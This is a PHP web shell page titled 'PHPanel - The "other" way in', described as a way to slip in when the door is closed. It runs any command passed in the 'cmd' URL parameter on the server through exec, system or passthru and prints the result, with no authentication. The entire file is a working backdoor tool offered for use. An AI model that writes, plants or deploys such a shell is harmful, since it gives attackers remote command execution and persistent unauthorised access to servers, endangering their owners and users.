<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PHPanel - The "other" way in</title>
        <style>
            body{
                background-color: #e8e8e8;
                text-align: center;
            }

            h1{
                color: #5c5c5c;
            }

            p{
                color: #757575;
            }

            #output{
                padding: 10px;
                text-align: left;
                background-color: #cfcfcf;
                margin: 0 auto;
                width: 90%;
                border-radius: 15px;
                margin-top: 15px;
            }
        </style>
    </head>
    <body>
        <h1>PHPanel - The "other" way in</h1>
        <p>When someone closes their door, I slip in trought their chimney</p>
        <form action="">
            <label for="cmd">Command:</label>
            <br>
            <br>
            <input type="text" name="cmd" id="">
            <br>
            <label for="exec">Exec</label>
            <input type="checkbox" name="exec" value="true" <?php if(isset($_GET['exec']) && $_GET['exec'] == 'true'){echo "checked";}?>>
            <label for="system">System</label>
            <input type="checkbox" name="system" value="true" <?php if(isset($_GET['system']) && $_GET['system'] == 'true'){echo "checked";}?>>
            <label for="passthrou">Passthru</label>
            <input type="checkbox" name="passthru" value="true" <?php if(isset($_GET['passthru']) && $_GET['passthru'] == 'true'){echo "checked";}?>>
            <br>
            <button>Send in!</button>
        </form>
        <div id="output">
            <?php

            $get = $_GET['cmd'] ?? die("Type your command above and choose your execution function");
            
            function get_exec($get){
                $_temp = [];
                exec($get, $_temp);
                return $_temp;
            }

            function get_system($get){
                return system($get);
            }

            function get_passthru($get){
                return passthru($get);
            }
            
            // Real

            if (isset($_GET['exec'])){
                echo "<h2>Exec data:</h2><hr>";
                echo "<div>";
                foreach (get_exec($get) as $o){
                    echo "<h5>{$o}</h5>";
                }
                echo "</div>";
            }

            if (isset($_GET['system'])){
                echo "<h2>System data:</h2><hr>";
                echo "<div>";
                foreach(preg_split('/\n/', get_system($get)) as $o){
                    echo "<h5>{$o}</h5>";
                }
                echo "</div>";
            }

            if (isset($_GET['passthru'])){
                echo "<h2>Passthru data:</h2><hr>";
                echo "<div>";
                foreach(preg_split('/\n/', get_passthru($get)) as $o){
                    echo "<h5>{$o}</h5>";
                }
                echo "</div>";
            }

            ?>
        </div>
    </body>
</html>
